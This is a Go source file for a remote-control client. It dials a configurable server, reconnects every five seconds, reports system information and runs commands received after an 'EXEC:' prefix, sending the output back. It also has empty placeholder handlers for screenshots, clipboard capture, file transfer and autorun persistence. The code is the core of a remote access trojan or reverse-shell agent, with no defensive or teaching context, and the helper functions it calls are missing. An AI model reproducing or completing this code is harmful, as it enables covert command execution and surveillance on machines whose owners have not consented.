package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func main() {
	serverAddr := "127.0.0.1"
	port := "1337"

	if len(os.Args) > 1 {
		serverAddr = os.Args[1]
	}
	if len(os.Args) > 2 {
		port = os.Args[2]
	}

	for {
		conn, err := net.Dial("tcp", serverAddr+":"+port)
		if err != nil {
			fmt.Printf("[CLIENT] Failed to connect to %s:%s. Retrying in 5s...\n", serverAddr, port)
			time.Sleep(5 * time.Second)
			continue
		}

		fmt.Println("[CLIENT] Connected to server at", serverAddr+":"+port)
		if err := sendInitialInfo(conn); err != nil {
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}

		handleServer(conn)
		fmt.Println("[CLIENT] Connection lost. Reconnecting in 5s...")
		time.Sleep(5 * time.Second)
	}
}

func handleServer(conn net.Conn) {
	reader := bufio.NewReader(conn)

	for {
		msg, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		msg = strings.TrimSpace(msg)

		switch {
		case msg == "INFO":
			info := gatherInfo()
			conn.Write([]byte(info))

		case strings.HasPrefix(msg, "EXEC:"):
			cmdStr := strings.TrimPrefix(msg, "EXEC:")
			output := execCommand(cmdStr)
			conn.Write([]byte(output + "<END>\n"))

		case strings.HasPrefix(msg, "SCREENSHOT"):
			// placeholder

		case strings.HasPrefix(msg, "CLIPBOARD"):
			// placeholder

		case strings.HasPrefix(msg, "FILETRANSFER"):
			// placeholder

		case strings.HasPrefix(msg, "AUTORUN"):
			// placeholder

		}
	}
}
